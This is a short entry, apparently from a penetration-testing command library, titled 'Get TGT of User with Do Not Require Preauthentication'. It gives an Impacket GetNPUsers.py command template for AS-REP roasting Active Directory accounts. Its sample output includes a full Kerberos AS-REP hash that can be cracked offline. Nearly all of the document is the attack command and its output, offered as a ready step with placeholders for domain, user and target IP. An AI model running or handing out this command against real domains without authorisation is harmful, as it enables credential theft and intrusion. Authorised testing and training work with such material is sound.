---
id: 227290c9-5af5-4575-8a0d-2715cf539269
name: Get TGT of User with "Do Not Require Preauthentication"
type: command
executor: bash
data: GetNPUsers.py $_DOMAIN/$_USER -dc-ip $_TARGET_IP -no-pass
output: 'root@kali:~# GetNPUsers.py bank.local/service-account -dc-ip 10.10.10.10
  -no-pass

  Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation


  [*] Getting TGT for service-account

  $krb5asrep$23$service-account@BANK.LOCAL:7311125b58d0f700b4a438e1a2db8b69$f59052b34ebbe6e542bf8bd07a4ea882817c4b92b0ec243a1b636b3c56a1b994a13e3ab4cb5d3857b397a2a8706c17beb24d2976a391884d93e2248ee8a87edfd65c86b7976ea9a7e7ee04a12b0a488a174e3582cc580f6ca4fd005e4e495da77d85ad11648fca47de4447ee7af8024c6ea056410142e560aed11f4ec91647e5f8018e90104d8f0fb9595ac396b470c18cfe976d6f4389472eb351fd2bbf03972a95160953ba5bf8757f88a7621a74d5608945f26daf6ab7d3ccd0f322f5c839ac19332c9a515b5001286e8cb17918562ad4d95cd5baf12eecd9ca1b4c07d1726db206e15309'
created_at: '2020-03-14T00:32:07.021198+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Get TGT of User with "Do Not Require Preauthentication"

```bash
GetNPUsers.py $_DOMAIN/$_USER -dc-ip $_TARGET_IP -no-pass
```

## Expected Output

```
root@kali:~# GetNPUsers.py bank.local/service-account -dc-ip 10.10.10.10 -no-pass
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for service-account
$krb5asrep$23$service-account@BANK.LOCAL:7311125b58d0f700b4a438e1a2db8b69$f59052b34ebbe6e542bf8bd07a4ea882817c4b92b0ec243a1b636b3c56a1b994a13e3ab4cb5d3857b397a2a8706c17beb24d2976a391884d93e2248ee8a87edfd65c86b7976ea9a7e7ee04a12b0a488a174e3582cc580f6ca4fd005e4e495da77d85ad11648fca47de4447ee7af8024c6ea056410142e560aed11f4ec91647e5f8018e90104d8f0fb9595ac396b470c18cfe976d6f4389472eb351fd2bbf03972a95160953ba5bf8757f88a7621a74d5608945f26daf6ab7d3ccd0f322f5c839ac19332c9a515b5001286e8cb17918562ad4d95cd5baf12eecd9ca1b4c07d1726db206e15309
```


